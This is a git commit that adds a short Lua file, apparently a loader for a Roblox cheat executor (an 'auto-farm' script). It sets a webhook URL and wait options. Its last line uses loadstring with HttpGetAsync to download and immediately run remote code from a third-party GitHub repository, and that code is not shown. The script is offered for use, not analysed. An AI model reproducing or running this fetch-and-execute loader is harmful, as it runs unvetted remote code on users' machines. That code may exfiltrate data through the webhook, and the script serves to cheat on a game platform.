ff735a248067c58da1cbb1fed9d531a47659fb17
Hydraa <100966602+SentinelLoader@users.noreply.github.com>
2023-04-24 16:04:18 -0400

    Create lol.lua

---
+++ lol.lua
@@ -0,0 +1,7 @@
+getgenv().WebhookURL = ""
+
+getgenv().WaitTrue = false;
+
+getgenv().Wait = 0; -- How much time to wait before it hops, use if you get synapse firewall issue.
+
+loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Eviltwin001/Comet-Farm/main/Comet%20Farm%20V2"))()
